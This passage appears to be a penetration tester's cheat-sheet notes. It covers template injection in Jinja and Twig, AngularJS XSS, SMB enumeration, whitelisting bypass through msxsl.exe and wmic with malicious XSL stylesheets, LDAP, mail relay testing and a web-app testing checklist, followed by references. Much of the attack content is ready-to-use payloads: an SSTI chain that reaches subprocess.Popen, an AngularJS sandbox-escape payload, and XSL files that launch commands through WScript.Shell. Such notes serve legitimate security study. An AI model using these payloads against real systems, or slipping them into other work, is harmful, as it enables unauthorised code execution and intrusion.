### ANGULAR

- Observe if input is enclosed in an ng-app directive. Perhaps in `<body>` tag. [27]

## CONFIRMING EXPLOITABILITY

### JINJA

- `{{ 3 * '3' }}` will resolve to 333. Python.

### TWIG

- `{{ 3 * '3' }}` will resolve to 9. PHP.

### JAVASCRIPT

- `${ 7 * 7 }` will resolve to 49.

## SEARCHING FOR EXPLOITABLE CLASSES

### JINJA

```
{{ ''.__class__.__mro__[1].__subclasses__()[0:10] }}
```

- Returns first 10 classes. Iterate and identify exploitable classes.

## EXPLOITABLE CLASSES

### -

```
os.system
```

### - [21]

```
subprocess.Popen
```

```
{{ ''.__class__.__mro__[1].__subclasses__()[<INSERT INDEX HERE>]('ls',shell=True,stdout=-1).communicate() }}
```

## EXAMPLE PAYLOAD

### [27]

```
{{$on.constructor('alert(1)')()}}
```

```
https://0aae00d903ba322ec0211e0e00c700e3.web-security-academy.net/?search={{$on.constructor(%27alert(1)%27)()}}
```

# SMB

## ENUMERATION

### NMAP

#### -

```
nmap --script smb-os-discovery <IP>
```

#### -

```
nmap --script smb-security-mode <IP>
```

## CONNECTING

### SMBCLIENT [22]

#### -

```
smbclient -L <IP>
```

- Enter null password to login as anonymous
- This will show list of Shares and Servers

#### -

```
smbclient \\\\<IP>\\<shareName>
```

- Enter null password to login as anonymous
- This will provide access to remote share

# XSL SCRIPT BYPASS

## USING MSXSL.EXE

###  EXPLANATION

- msxsl.exe is a Microsoft-developed command utility to process Extensible Stylesheet Language (XSL) files.
- It is possible to embed malicious JS/VBScript into XSL file
- msxsl.exe no longer installed by default on machines.

### USAGE

```
msxsl.exe <DUMMY_XML_FILE> evil.xsl
```

### SCRIPT (IMMERSIVELABS)

```
<?xml version="1.0"?>
-<xsl:stylesheet xmlns:user="http://mycompany.com/mynamespace" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">

<msxsl:script language="JScript" implements-prefix="user">function xml(nodelist) { var r = new ActiveXObject("WScript.Shell").Run("cmd.exe /k C:\\Secret\\a.exe");return nodelist.nextNode().xml;} </msxsl:script>

-<xsl:template match="/">
<xsl:value-of select="user:xml(.)"/>
</xsl:template>
</xsl:stylesheet>
```

## USING WMIC [18]

### EXPLANATION

- Invoke any wmic command and specify /format pointing to the evil.xsl:

### USAGE

```
wmic os get /FORMAT:"evil.xsl"
```

### SCRIPT [18]

```
<?xml version='1.0'?>
<stylesheet
xmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="placeholder"
version="1.0">
<output method="text"/>

<ms:script implements-prefix="user" language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc");
]]> </ms:script>

</stylesheet>
```

# TOOLS

## SSL SCANNERS

### testssl.sh

[19] https://testssl.sh/

### cipher-suite-enum.pl

[20] https://labs.portcullis.co.uk/tools/ssl-cipher-suite-enum/

# LDAP (Lightweight Directory Access Protocol)

## SUMMARY

- LDAP is a protocol used at organizational network level to handle services such as hosts, servers, printers, scanners, etc.
- Port 389 for standard
- Port 636 for communication over TLS

## ATTACK VECTOR

- During authentication phase, credentials sent in plaintext.

# MAIL RELAY

## EXAMPLE

```
nc -v 204.135.8.97 25

<SERVER> [IP] 25 (smtp) open

220 <SERVER> ESMTP Wed, 10 May 2023 21:43:24 -0500

HELO praetorian.com

250 <SERVER> Hello <ME> [MYIP], pleased to meet you

MAIL FROM: <nicholas.barnes@praetorian.com>

250 2.1.0 Sender ok

RCPT TO: <test@example.com>
```

  
  

# ATTACK PATH

## AUTHENTICATION

### PASSWORD STRENGTH (ASVS)

### MFA CAPABILITY

### HARD-CODED SECRETS

### USER ENUMERATION

#### TIMING

#### SERVER ERROR RESPONSE

#### PASSWORD RESET

### PASSWORD RESET FUNCTIONALITY

### BRUTE-FORCE ATTACK

## SESSION MANAGEMENT

### SESSION TOKEN IN URL

### SESSION TOKEN STRENGTH

#### 64 bits entropy

#### Secure cryptographic generation

### COOKIE ATTRIBUTES

#### Secure

#### HttpOnly

#### SameSite

### SESSION FIXATION

#### New token should be generated upon authentication

### SESSION TERMINATION

#### Excessive duration

#### Logout should invalidate token

## ACCESS CONTROL

### INSUFFICIENT AUTHORIZATION CHECKS

#### AUTORIZE

### CSRF

### OVERLY PERMISSIVE CORS

## INPUT VALIDATION

### XSS

#### XSS polyglot testing

### SQL INJECTION

### XXE INJECTION

### URL REDIRECTS

## CRYPTOGRAPHY

## FILE UPLOAD

## TLS CONNECTION

  

ENUMERATION NUDGES

- Existence of "dist" directory within website js files. Indicates existence of unnecessary files in the directory that could expand the attack surface.

- Confirm this by accessing README.md. I.e. "https://openitcockpit/js/vendor/gridstack/README.md"

- Exploit by finding DOM XSS in included html files

  
  
  
  
  
  
  

References

[1] https://www.hackingarticles.in/comprehensive-guide-on-remote-file-inclusion-rfi/
[2] http://securityidiots.com/Web-Pentest/LFI/guide-to-lfi.html
[3] https://oscp.infosecsanyam.in/shells/linux-reverse-shell-one-liner
[4] https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet
[5] https://github.com/aramosf/sqlmap-cheatsheet/blob/master/sqlmap%20cheatsheet%20v1.0-SBD.pdf
[6] https://www.hackingarticles.in/beginner-guide-sql-injection-boolean-based-part-2/
[7] BooleanBlindInjectionScript.txt
[8] TimeBlindInjectionScript.txt
[9] https://dev.mysql.com/doc/refman/8.0/en/privileges-provided.html#priv_file
[10] https://dev.mysql.com/doc/refman/8.0/en/string-functions.html#function_load-file
[11] https://docs.securezombie.com/enumeration/sql-injection
[12] https://portswigger.net/web-security/xxe
[13] https://blog.cobalt.io/how-to-execute-an-xml-external-entity-injection-xxe-5d5c262d5b16?gi=e699a1087f47
[14] https://portswigger.net/web-security/xxe/blind
[15] https://dhiyaneshgeek.github.io/web/security/2021/02/19/exploiting-out-of-band-xxe/
[16] https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection
[17] https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#php-wrapper-inside-xxe
[18] https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/code-execution/application-whitelisting-bypass-with-wmic-and-xsl.md
[19] https://testssl.sh/
[20] https://www.blackhillsinfosec.com/a-toast-to-kerberoast/
[21] https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee
[22] https://tldp.org/HOWTO/SMB-HOWTO-8.html
[23] https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink
[24] https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink
[25] https://brutelogic.com.br/blog/building-xss-polyglots/
[26] https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded
[27] https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression
[28] https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected
[29] https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf
[30] https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked
[31] https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
[32] https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked
[33] https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/tabindex
[34] https://portswigger.net/web-security/oauth
[35] https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect
[36] https://portswigger.net/web-security/cors/lab-breaking-https-attack
[37] https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/linux
[38] https://github.com/sqlmapproject/udfhack
[39] https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5
[40] https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
[41] https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql
[42] https://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet
[43] https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-list-columns
[44] https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html#whitebox-review_3
[45] https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/DotNET.md#detection
[46] https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/DotNET.md#xmlserializer
[47] https://github.com/Sn1r/Nim-Reverse-Shell